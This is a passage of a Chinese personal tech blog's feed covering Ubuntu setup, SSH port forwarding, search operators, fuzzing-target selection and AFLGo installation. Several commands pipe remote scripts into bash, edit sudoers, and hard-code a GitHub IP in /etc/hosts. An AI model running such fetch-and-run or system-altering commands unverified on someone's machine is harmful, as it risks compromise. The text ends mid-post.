打印success即说明配置成功</span>timeout 5s curl -I google.com &amp;&amp; <span class="hljs-built_in">echo</span> success || <span class="hljs-built_in">echo</span> fail</code></pre></div><ul><li>配置代理的一个大坑：保证http_proxy等代理对sudo生效（不论当前用户是否为root，都需要添加以下内容）</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment">#/etc/sudoers</span>Defaults env_keep += <span class="hljs-string">"http_proxy https_proxy ftp_proxy"</span></code></pre></div><h3 id="更换镜像源"><a href="#更换镜像源" class="headerlink" title="更换镜像源"></a>更换镜像源</h3><ul><li>清华源</li></ul><div class="hljs"><pre><code class="hljs bash">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse<span class="hljs-comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse<span class="hljs-comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse<span class="hljs-comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse<span class="hljs-comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span></code></pre></div><ul><li>自动化换源（暂时只支持Ubuntu）</li></ul><div class="hljs"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@github.com:QGrain/My-Awesome-Configuration.git awesome-conf<span class="hljs-built_in">pushd</span> awesome-conf/mirror-sourcechmod u+x change-mirror-source.sh./change-mirror-source.sh<span class="hljs-built_in">popd</span></code></pre></div><h3 id="其他的坑"><a href="#其他的坑" class="headerlink" title="其他的坑"></a>其他的坑</h3><ul><li>再记录一个关于Ubuntu 22 in VMware的坑<ul><li>安装[open-vm-tools, open-vm-tools-desktop]和vmware-tools是互斥的两个</li></ul></li></ul><h2 id="2-软件配置"><a href="#2-软件配置" class="headerlink" title="2 软件配置"></a>2 软件配置</h2><h3 id="常用软件"><a href="#常用软件" class="headerlink" title="常用软件"></a>常用软件</h3><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 常用网络工具</span>sudo apt install -y net-tools openssh-server curl inetutils-ping<span class="hljs-comment"># 常用运维工具</span>sudo apt install -y screen tmux<span class="hljs-comment"># 常用系统资源管理工具</span>sudo apt install -y htop screenfetch <span class="hljs-comment"># neofetch</span></code></pre></div><h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><ul><li>基本配置</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 安装git</span>sudo apt install git<span class="hljs-comment"># 配置账号</span>git config --global user.name <span class="hljs-string">"GIT_USERNAME"</span>git config --global user.email <span class="hljs-string">"GIT_EMAIL"</span><span class="hljs-comment"># 配置代理，仅针对https://github.com代理。移除此字段则是全局代理</span>git config --global http.https://github.com.proxy <span class="hljs-string">"socks5://PROXY_IP:PROXY_PORT"</span>git config --global https.https://github.com.proxy <span class="hljs-string">"socks5://PROXY_IP:PROXY_PORT"</span></code></pre></div><ul><li>配置<code>github ssh keys</code></li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 生成公私钥对</span>ssh-keygen -t rsa -C <span class="hljs-string">"YOUR_COMMENT"</span><span class="hljs-comment"># 将id_rsa.pub公钥上传至Github &gt; Settings &gt; SSH and GPG keys</span><span class="hljs-comment"># 测试配置是否成功</span>ssh -T git@github.com<span class="hljs-comment"># 注意！若提示需要输入git@github.com's password则说明github.com域名被污染，其解析的ip不正确，需要改/etc/hosts，添加以下一行即可（但是很奇怪的是无法再ping通了）</span>20.205.243.166 github.com<span class="hljs-comment"># 也可以直接上 https://github.com/521xueweihan/GitHub520</span></code></pre></div><h3 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h3><ul><li>安装vim</li></ul><div class="hljs"><pre><code class="hljs bash">sudo apt install vim<span class="hljs-comment"># 使用个人常用的精简配置</span>wget -c https://raw.githubusercontent.com/QGrain/My-Awesome-Configuration/master/vim/vimrc -O ~/.vimrc</code></pre></div><ul><li>配置<code>Spacevim</code>？Todo</li></ul><h3 id="Oh-My-Zsh"><a href="#Oh-My-Zsh" class="headerlink" title="Oh-My-Zsh"></a>Oh-My-Zsh</h3><ul><li>安装与配置</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 安装zsh</span>sudo apt install zsh<span class="hljs-comment"># 安装ohmyzsh</span>sh -c <span class="hljs-string">"<span class="hljs-variable">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>"</span><span class="hljs-comment"># 拉取个人zshrc配置</span>wget -c https://raw.githubusercontent.com/QGrain/My-Awesome-Configuration/master/zsh/zshrc -O ~/.zshrc<span class="hljs-comment"># Source</span><span class="hljs-built_in">source</span> ~/.zshrc</code></pre></div><ul><li>支持<code>/etc/profile.d/*.sh</code>脚本</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 在/etc/zsh/zprofile中追加以下内容</span><span class="hljs-keyword">if</span> [ -d /etc/profile.d ]; <span class="hljs-keyword">then</span>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> /etc/profile.d/*.sh; <span class="hljs-keyword">do</span>    <span class="hljs-keyword">if</span> [ -r <span class="hljs-variable">$i</span> ]; <span class="hljs-keyword">then</span>      . <span class="hljs-variable">$i</span>    <span class="hljs-keyword">fi</span>  <span class="hljs-keyword">done</span>  <span class="hljs-built_in">unset</span> i<span class="hljs-keyword">fi</span></code></pre></div><h3 id="neovim"><a href="#neovim" class="headerlink" title="neovim"></a>neovim</h3><h3 id="fzf"><a href="#fzf" class="headerlink" title="fzf"></a>fzf</h3><div class="hljs"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> --depth 1 https://github.com/junegunn/fzf.git ~/.fzf~/.fzf/install</code></pre></div><h3 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h3><ul><li>源码安装指定版本，我曾经写过一个脚本，但是没空找了</li></ul><h3 id="miniconda3"><a href="#miniconda3" class="headerlink" title="miniconda3"></a>miniconda3</h3><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 从官方站点下载速度较慢，可从国内镜像站下载miniconda3-py38 64-bit</span>wget -c https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/Miniconda3-py38_4.12.0-Linux-x86_64.sh<span class="hljs-comment"># 添加当前用户可执行权限</span>chmod u+x ./Miniconda3-py38_4.12.0-Linux-x86_64.sh<span class="hljs-comment"># 执行安装脚本，依照提示完成安装</span>./Miniconda3-py38_4.12.0-Linux-x86_64.sh<span class="hljs-comment"># 添加环境变量</span>sudo touch /etc/profile.d/my_software.sh<span class="hljs-built_in">echo</span> <span class="hljs-string">"export PATH=<span class="hljs-variable">$PATH</span>:/home/<span class="hljs-variable">$USER</span>/miniconda3/bin"</span> &gt;&gt; /etc/profile.d/my_software.sh<span class="hljs-built_in">source</span> /etc/profile.d/my_software.sh<span class="hljs-comment"># 注: 如果是zsh，则需要注意是否在/etc/zsh/zprofile中添加了相关支持</span></code></pre></div><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><ul><li>docker安装：</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 详细参见菜鸟教程，我就不照搬了 qwq</span>https://www.runoob.com/docker/ubuntu-docker-install.html</code></pre></div><ul><li>容器内常用软件安装，参见本文前半部分的常用软件安装</li></ul><h2 id="3-开发配置"><a href="#3-开发配置" class="headerlink" title="3 开发配置"></a>3 开发配置</h2><h3 id="C-x2F-C"><a href="#C-x2F-C" class="headerlink" title="C&#x2F;C++"></a>C&#x2F;C++</h3><ul><li>gcc-9&#x2F;g++-9：由于Ubuntu22自带的gcc版本是11较高，为了兼容部分源码安装gcc-9以及g++-9</li></ul><div class="hljs"><pre><code class="hljs bash">sudo apt install gcc-9 g++-9<span class="hljs-comment"># 配置update-alternatives</span>sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-11 20 --slave /usr/bin/g++ g++ /usr/bin/g++-11 --slave /usr/bin/gcov gcov /usr/bin/gcov-11 --slave /usr/bin/gcc-ar gcc-ar /usr/bin/gcc-ar-11 --slave /usr/bin/gcc-nm gcc-nm /usr/bin/gcc-nm-11 --slave /usr/bin/gcc-ranlib gcc-ranlib /usr/bin/gcc-ranlib-11sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 90 --slave /usr/bin/g++ g++ /usr/bin/g++-9 --slave /usr/bin/gcov gcov /usr/bin/gcov-9 --slave /usr/bin/gcc-ar gcc-ar /usr/bin/gcc-ar-9 --slave /usr/bin/gcc-nm gcc-nm /usr/bin/gcc-nm-9 --slave /usr/bin/gcc-ranlib gcc-ranlib /usr/bin/gcc-ranlib-9</code></pre></div><ul><li>llvm-11 (with gold plugin)：插桩利器</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 一键安装（预计四十分钟？）</span>curl https://gitee.com/QGrain/aflgo-build/raw/master/build_llvm_11.sh | bash</code></pre></div><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><ul><li>Java长期支持版本</li></ul><table><thead><tr><th>版本</th><th>初始发行</th><th>停止维护</th><th>下载链接</th></tr></thead><tbody><tr><td>17</td><td>2021-09-14</td><td>2029-09-30</td><td><a href="https://www.oracle.com/java/technologies/downloads/#java17" target="_blank" rel="noopener">Java17 Download</a></td></tr><tr><td>11</td><td>2018-09-25</td><td>2026-09-30</td><td><a href="https://www.oracle.com/java/technologies/javase/jdk11-archive-downloads.html" target="_blank" rel="noopener">Java11 Download</a></td></tr><tr><td>8</td><td>2014-03-18</td><td>2030-07-19</td><td><a href="https://www.oracle.com/java/technologies/javase/javase8u211-later-archive-downloads.html" target="_blank" rel="noopener">Java8 Download</a></td></tr></tbody></table><ul><li>选择下载jdk17</li></ul><h3 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h3><ul><li>Easygoing: <a href="https://go.dev/dl/" target="_blank" rel="noopener">https://go.dev/dl/</a></li></ul><h3 id="Rust"><a href="#Rust" class="headerlink" title="Rust"></a>Rust</h3><ul><li>Easygoing: <a href="https://www.rust-lang.org/zh-CN/tools/install" target="_blank" rel="noopener">https://www.rust-lang.org/zh-CN/tools/install</a></li></ul><h3 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h3><ul><li>Easygoing: <a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">https://nodejs.org/en/download/</a></li></ul><h2 id="4-CTF配置"><a href="#4-CTF配置" class="headerlink" title="4 CTF配置"></a>4 CTF配置</h2><h3 id="Burpsuite-Pro-2022"><a href="#Burpsuite-Pro-2022" class="headerlink" title="Burpsuite Pro 2022"></a>Burpsuite Pro 2022</h3><h3 id="IDA-Pro-7-7"><a href="#IDA-Pro-7-7" class="headerlink" title="IDA Pro 7.7"></a>IDA Pro 7.7</h3><p>更多详见百度网盘</p><p>To be completed</p>]]></content>
    
    
    <categories>
      
      <category>Configuration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSH端口转发用法解析</title>
    <link href="/2021/02/18/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%94%A8%E6%B3%95%E8%A7%A3%E6%9E%90/"/>
    <url>/2021/02/18/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%94%A8%E6%B3%95%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>SSH端口转发是一个很实用的运维技巧，我结合了man page解析了SSH端口转发的本地转发(-L)，远程转发(-R)，动态转发(-D)和常用相关参数的用法。</p><a id="more"></a><h2 id="名词设置"><a href="#名词设置" class="headerlink" title="名词设置"></a>名词设置</h2><p>为了方便表述，我定义了一些名词（可能并不规范）</p><ul><li><p>客户端与服务端：</p><ul><li>ssh客户端：发起ssh连接请求的所在端，指ssh-client，也可以指其所在的主机</li><li>ssh服务端：ssh连接请求的对象所在端，指ssh-server，也可以指其所在的主机</li><li>端口客户端：向某端口发起服务请求的应用或主机</li><li>端口服务端：想某端口提供服务响应的应用或主机</li></ul></li><li><p>机器：</p><ul><li>本地主机（local）：指ssh客户端所在的主机，记作A</li><li>远端主机（remote）：指ssh服务端所在的主机，记作B</li><li>Host主机（host）：指要转发的端口服务端所在的主机，记作C</li></ul></li></ul><h2 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h2><p>man page：</p><div class="hljs"><pre><code class="hljs bash">-L [bind_address:]port:host:hostport-L [bind_address:]port:remote_socket-L local_socket:host:hostport-L local_socket:remote_socket        Specifies that connections to the given TCP port or Unix socket on the <span class="hljs-built_in">local</span> (client) host are to be forwarded to the given host and port, or Unix socket, on the remote side.  This works by allocating a socket to listen to either a TCP port on the <span class="hljs-built_in">local</span> side, optionally bound to the specified bind_address, or to a Unix socket.  Whenever a connection is made to the <span class="hljs-built_in">local</span> port or socket, the connection is forwarded over the secure channel, and a connection is made to either host port hostport, or the Unix socket remote_socket, from the remote machine.        Port forwardings can also be specified <span class="hljs-keyword">in</span> the configuration file.  Only the superuser can forward privileged ports.  IPv6 addresses can be specified by enclosing the address <span class="hljs-keyword">in</span> square brackets.        By default, the <span class="hljs-built_in">local</span> port is bound <span class="hljs-keyword">in</span> accordance with the GatewayPorts setting.  However, an explicit bind_address may be used to <span class="hljs-built_in">bind</span> the connection to a specific address.  The bind_address of “localhost” indicates that the listening port be bound <span class="hljs-keyword">for</span> <span class="hljs-built_in">local</span> use only, <span class="hljs-keyword">while</span> an empty address or ‘*’ indicates that the port should be available from all interfaces.</code></pre></div><h2 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h2><p>man page：</p><div class="hljs"><pre><code class="hljs bash">-R [bind_address:]port:host:hostport-R [bind_address:]port:local_socket-R remote_socket:host:hostport-R remote_socket:local_socket-R [bind_address:]port        Specifies that connections to the given TCP port or Unix socket on the remote (server) host are to be forwarded to the <span class="hljs-built_in">local</span> side.        This works by allocating a socket to listen to either a TCP port or to a Unix socket on the remote side.  Whenever a connection is made to this port or Unix socket, the connection is <span class="hljs-keyword">for</span>‐warded over the secure channel, and a connection is made from the <span class="hljs-built_in">local</span> machine to either an explicit destination specified by host port hostport, or local_socket, or, <span class="hljs-keyword">if</span> no explicit destination was specified, ssh will act as a SOCKS 4/5 proxy and forward connections to the destinations requested by the remote SOCKS client.        Port forwardings can also be specified <span class="hljs-keyword">in</span> the configuration file.  Privileged ports can be forwarded only when logging <span class="hljs-keyword">in</span> as root on the remote machine.  IPv6 addresses can be specified by enclosing the address <span class="hljs-keyword">in</span> square brackets.        By default, TCP listening sockets on the server will be bound to the loopback interface only.  This may be overridden by specifying a bind_address.  An empty bind_address, or the address ‘*’, indicates that the remote socket should listen on all interfaces.  Specifying a remote bind_address will only succeed <span class="hljs-keyword">if</span> the server<span class="hljs-string">'s GatewayPorts option is enabled (see sshd_config(5)).        If the port argument is ‘0’, the listen port will be dynamically allocated on the server and reported to the client at run time.  When used together with -O forward the allocated port will be printed to the standard output.</span></code></pre></div><h2 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h2><p>man page：</p><div class="hljs"><pre><code class="hljs bash">-D [bind_address:]port        Specifies a <span class="hljs-built_in">local</span> “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the <span class="hljs-built_in">local</span> side, optionally bound to the specified bind_address.  Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is <span class="hljs-keyword">then</span> used to determine <span class="hljs-built_in">where</span> to connect to from the remote machine. Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports.  Dynamic port forwardings can also be specified <span class="hljs-keyword">in</span> the configuration file.        IPv6 addresses can be specified by enclosing the address <span class="hljs-keyword">in</span> square brackets.  Only the superuser can forward privileged ports.  By default, the <span class="hljs-built_in">local</span> port is bound <span class="hljs-keyword">in</span> accordance with the GatewayPorts setting. However, an explicit bind_address may be used to <span class="hljs-built_in">bind</span> the connection to a specific address.  The bind_address of “localhost” indicates that the listening port be bound <span class="hljs-keyword">for</span> <span class="hljs-built_in">local</span> use only, <span class="hljs-keyword">while</span> an empty address or ‘*’ indicates that the port should be available from all interfaces.</code></pre></div><h2 id="相关参数"><a href="#相关参数" class="headerlink" title="相关参数"></a>相关参数</h2>]]></content>
    
    
    <categories>
      
      <category>Tricks</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搜索引擎高级搜索技巧</title>
    <link href="/2021/01/20/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/"/>
    <url>/2021/01/20/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<p>常见搜索引擎Google和Baidu的高级搜索技巧</p><a id="more"></a><h2 id="1-逻辑匹配"><a href="#1-逻辑匹配" class="headerlink" title="1 逻辑匹配"></a>1 逻辑匹配</h2><p class="note note-primary">根据匹配逻辑可分为：精准，屏蔽，模糊和排他匹配</p>### 1.1 精准搜索<ul><li>指令：<code>&quot;关键词&quot;</code></li><li>作用：完全比配双引号中的内容，也即必须包含该内容</li></ul><h3 id="1-2-屏蔽搜索"><a href="#1-2-屏蔽搜索" class="headerlink" title="1.2 屏蔽搜索"></a>1.2 屏蔽搜索</h3><ul><li>指令：<code> -关键词</code></li><li>作用：屏蔽**-<strong>号后面的内容，注意</strong>-<strong>号前需有空格，而后面的关键词需紧跟着</strong>-**号</li></ul><h3 id="1-3-模糊搜索"><a href="#1-3-模糊搜索" class="headerlink" title="1.3 模糊搜索"></a>1.3 模糊搜索</h3><ul><li>指令：<code> *关键词</code></li><li>作用：模糊搜索通配符**<em><strong>接着</strong>关键词</em>*的内容，同样注意空格和关键词紧跟着通配符</li></ul><h3 id="1-4-排他搜索"><a href="#1-4-排他搜索" class="headerlink" title="1.4 排他搜索"></a>1.4 排他搜索</h3><ul><li>指令：<code>OR </code></li><li>作用：通过<strong>OR</strong>分隔两个搜索关键词，只会出现其中一个的搜索结果</li></ul><h2 id="2-搜索位置"><a href="#2-搜索位置" class="headerlink" title="2 搜索位置"></a>2 搜索位置</h2><p class="note note-primary">根据搜索的位置，可分为：站内，标题，网址和正文搜索</p>### 2.1 站内搜索<ul><li>指令：<code>site:网站地址</code></li><li>作用：在目标网站内搜索相关内容</li></ul><h3 id="2-2-标题搜索"><a href="#2-2-标题搜索" class="headerlink" title="2.2 标题搜索"></a>2.2 标题搜索</h3><ul><li>指令：<code>intitle:关键词</code></li><li>作用：关键词必须出现在网站标题中</li></ul><h3 id="2-3-网址搜索"><a href="#2-3-网址搜索" class="headerlink" title="2.3 网址搜索"></a>2.3 网址搜索</h3><ul><li>指令：<code>inurl:关键词</code></li><li>作用：关键词必须出现在网页url中</li></ul><h3 id="2-4-正文搜索"><a href="#2-4-正文搜索" class="headerlink" title="2.4 正文搜索"></a>2.4 正文搜索</h3><ul><li>指令：<code>intext:关键词</code></li><li>作用：关键词必须出现在网页正文中</li></ul><h2 id="3-其它"><a href="#3-其它" class="headerlink" title="3 其它"></a>3 其它</h2><p class="note note-primary">最后则是其它搜索方式，如搜索指定类型的文件</p>### 3.1 搜索文件类型<ul><li>指令：<code>filetype:文件类型</code></li><li>作用：搜索指定文件类型的文件</li></ul>]]></content>
    
    
    <categories>
      
      <category>Tricks</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Tricks</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见开源软件和开源库的调用关系</title>
    <link href="/2020/11/16/%E5%B8%B8%E8%A7%81%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E5%92%8C%E5%BC%80%E6%BA%90%E5%BA%93%E7%9A%84%E8%B0%83%E7%94%A8%E5%85%B3%E7%B3%BB/"/>
    <url>/2020/11/16/%E5%B8%B8%E8%A7%81%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E5%92%8C%E5%BC%80%E6%BA%90%E5%BA%93%E7%9A%84%E8%B0%83%E7%94%A8%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<p>开源社区有着许多开源软件，我将优先从以下<strong>几个角度</strong>去挑选开源软件，并找寻它们之间的<strong>依赖与调用关系</strong>：</p><a id="more"></a><ul><li><strong>支持AFL进行Fuzzing</strong>的开源软件(参考<a href="https://github.com/aflgo/oss-fuzz/tree/master/projects" target="_blank" rel="noopener">https://github.com/aflgo/oss-fuzz/tree/master/projects</a>)</li><li>提供<strong>文件操作API</strong>或者<strong>网络通信API</strong>的开源工具。因为它们所涉及的<strong>文件读取</strong>和<strong>通信协议栈</strong>往往更容易产生crash</li><li>体积不大，<strong>易于源码安装</strong></li></ul><h2 id="1-开源软件挑选"><a href="#1-开源软件挑选" class="headerlink" title="1 开源软件挑选"></a>1 开源软件挑选</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> yaml<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkAflSupport</span><span class="hljs-params">(dirname)</span>:</span>    <span class="hljs-keyword">try</span>:        f = open(dirname + <span class="hljs-string">'/project.yaml'</span>, <span class="hljs-string">'r'</span>)        data = yaml.load(f)    <span class="hljs-keyword">except</span>:        <span class="hljs-comment"># print('there is no project.yaml in %s' %dirname)</span>        <span class="hljs-keyword">pass</span>    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">if</span> <span class="hljs-string">'afl'</span> <span class="hljs-keyword">in</span> data[<span class="hljs-string">'fuzzing_engines'</span>]:            toolname = dirname.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]            print(toolname)    <span class="hljs-keyword">except</span>:        <span class="hljs-comment"># print('there is no fuzzing_engines given')</span>        <span class="hljs-keyword">pass</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    proj_dir = <span class="hljs-string">'./projects'</span>    projects = os.listdir(proj_dir)    <span class="hljs-keyword">for</span> proj_name <span class="hljs-keyword">in</span> projects:        <span class="hljs-keyword">if</span> os.path.isdir(proj_dir + <span class="hljs-string">'/'</span> + proj_name):            checkAflSupport(proj_dir + <span class="hljs-string">'/'</span> + proj_name)</code></pre></div><p>采用<code>parseFuzzProj.py</code>脚本拉取<a href="https://github.com/aflgo/oss-fuzz/tree/master/projects" target="_blank" rel="noopener">oss-fuzz</a>中支持AFL的开源软件，得到如下软件列表：</p><div class="hljs"><pre><code class="hljs bash">binutils brotli brunsli bzip2c-ares capstone cjson cmarkgraphicsmagick grok harfbuzzhermes hostapjbig2dec json-clcms libcbor libexif libfdk-aac libidn2 libldac libpcap libplist libspectre libtasn1 libteken libwebp libxml2 libyaml libyuv lz4miniz monero mupdfnanopb ndpi nestegg nghttp2 ntpopenjpeg openthread opus otspcre2 pffft proxygenqubes-osrnpspeex stbtidy-html5 tor tremorunicorn usrsctpvorbiswireshark woff2 wolfssl wuffsxzyajl-rubyzlib zlib-ng zstd</code></pre></div><p><strong>挑选与文件操作和网络通信相关的开源软件：</strong></p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 文件操作相关的开源软件</span>binutils bzip2groklibyaml libxml2 libjson-c3xzzlib<span class="hljs-comment"># 网络通信相关的开源软件</span>fastnetmonlibpcap libndpi wireshark</code></pre></div><h2 id="2-软件依赖关系查找"><a href="#2-软件依赖关系查找" class="headerlink" title="2 软件依赖关系查找"></a>2 软件依赖关系查找</h2><p><strong>软件之间的调用关系即依赖关系</strong>，我们可以借助包管理工具<code>apt</code>来查找开源软件的<strong>依赖有哪些</strong>以及<strong>被哪些软件依赖</strong>：</p><ul><li><p>查询镜像源是否有某款开源软件<code>SOFTWARE</code>：</p><div class="hljs"><pre><code class="hljs bash">sudo apt-cache search SOFTWARE_NAME | grep SOFTWARE_NAME</code></pre></div></li><li><p>查询某款开源软件<code>SOFTWARE</code>的依赖：</p><div class="hljs"><pre><code class="hljs bash">sudo apt-cache depends SOFTWARE_NAME | grep Depends</code></pre></div></li><li><p>查询某款开源软件<code>SOFTWARE</code>被哪些软件依赖：</p><div class="hljs"><pre><code class="hljs bash">sudo apt-cache rdepends SOFTWARE_NAME</code></pre></div></li></ul><h2 id="3-开源软件依赖组合分析"><a href="#3-开源软件依赖组合分析" class="headerlink" title="3 开源软件依赖组合分析"></a>3 开源软件依赖组合分析</h2><h3 id="3-1-libpcap"><a href="#3-1-libpcap" class="headerlink" title="3.1 libpcap"></a>3.1 libpcap</h3><h4 id="依赖与被依赖"><a href="#依赖与被依赖" class="headerlink" title="依赖与被依赖"></a>依赖与被依赖</h4><p><strong>depends：</strong></p><ul><li>libc6</li></ul><p><strong>rdepends：</strong></p><ul><li>wireshark-qt，wireshark-gtk，tshark</li><li>tcpdump，tcpreplay</li><li>snort，suricata，fastnetmon</li><li>nmap</li></ul><h4 id="代码相似性"><a href="#代码相似性" class="headerlink" title="代码相似性"></a>代码相似性</h4><ul><li><strong>与Nmap：</strong><ul><li>netmap&#x2F;libpcap与libpcap仓库下有大量同名.c代码文件，且有若干同名目录</li></ul></li></ul><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20201116221441.png" srcset="/img/loading.gif"><ul><li><p><strong>与suricata：</strong></p><ul><li>source-pcap.c中存在libpcap的API调用</li></ul></li><li><p><strong>与wireshark：</strong></p><ul><li>wireshark&#x2F;writecap&#x2F;pcapio.c存在libpcap magic number等相关字段和结构体</li><li>wireshark&#x2F;capture_opts.c</li></ul></li></ul><h2 id="TODO…"><a href="#TODO…" class="headerlink" title="TODO…"></a>TODO…</h2>]]></content>
    
    
    <categories>
      
      <category>Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFLGO安装与使用</title>
    <link href="/2020/10/21/AFLGO%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2020/10/21/AFLGO%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/aflgo/aflgo" target="_blank" rel="noopener">AFLGO</a>是基于<a href="https://github.com/google/AFL" target="_blank" rel="noopener">AFL</a>改进而来的一种定向灰盒模糊测试工具。</p><a id="more"></a><p>AFLGo基于llvm实现了函数调用图CG和控制流图CFG的获取，结合对程序CG&#x2F;CFG定义了一种基于目标distance衡量的种子调度策略，使得Fuzzer能够更快生成可抵达目的位置的测试用例。定向灰盒模糊测试(Directed Greybox Fuzzing)常常用于补丁测试，漏洞复现等等具备特定待测目标的软件测试任务场景。</p><h2 id="1-安装AFLGO"><a href="#1-安装AFLGO" class="headerlink" title="1 安装AFLGO"></a>1 安装AFLGO</h2><ul><li>安装llvm和clang，官方文档要求是3.8或者4.0，经过自己测试6.0和11.0和也可以使用，<strong>确保环境$PATH或$LLVM_CONFIG变量已经添加</strong></li><li>执行<a href="https://raw.githubusercontent.com/aflgo/aflgo/master/scripts/build/aflgo-build.sh" target="_blank" rel="noopener">官方一键安装脚本</a>，此脚本疑似有问题（截止至2020年10月），其中llvm-4.0和clang-4.0会安装失败</li><li>因此依照<a href="https://github.com/aflgo/aflgo" target="_blank" rel="noopener">官方README</a>的指示，我编写了一键安装<strong>llvm 11.0</strong>以及AFLGo的<a href="https://gitee.com/QGrain/aflgo-build/tree/master" target="_blank" rel="noopener">脚本</a>：</li></ul><div class="hljs"><pre><code class="hljs bash">curl https://gitee.com/QGrain/aflgo-build/raw/master/aflgo-build.sh | bash</code></pre></div><h2 id="2-常见开源库和软件"><a href="#2-常见开源库和软件" class="headerlink" title="2 常见开源库和软件"></a>2 常见开源库和软件</h2><p><strong>Google</strong>已经总结了<a href="https://github.com/google/oss-fuzz/tree/master/projects" target="_blank" rel="noopener">三百多款常见的开源软件</a>用于模糊测试，每一个工具的目录结构如下：</p><blockquote><p>&#x2F;PATH&#x2F;TO&#x2F;TOOL<br>│─  <strong>build.sh</strong><br>│─  <strong>Dockerfile</strong><br>│─  <strong>project.yaml</strong><br>└─  <strong>my-api-repo</strong><br>        │─  do_stuff_fuzzer.cpp<br>        │─  do_stuff_fuzzer.dict<br>        │─  do_stuff_unittest.cpp<br>        │─  Makefile<br>        │─  my_api.cpp<br>        │─  my_api.h<br>        │─  README.md<br>        │─  standalone_fuzz_target_runner.cpp<br>    └─  <strong>do_stuff_test_data</strong><br>        │─  410c23d234e7f97a2dd6265eb2909324deb8c13a<br>        │─  7a74862169c3375f4149daff75187cbca7372a38</p></blockquote><p>并不是所有的工具都提供了相关的代码和语料，但是每一款工具都给出了</p><ul><li><strong>project.yaml：</strong>记录了项目基本信息，例如：</li></ul><div class="hljs"><pre><code class="hljs yaml"><span class="hljs-attr">homepage:</span> <span class="hljs-string">"https://www.gnu.org/software/binutils/"</span><span class="hljs-attr">language:</span> <span class="hljs-string">c++</span><span class="hljs-attr">primary_contact:</span> <span 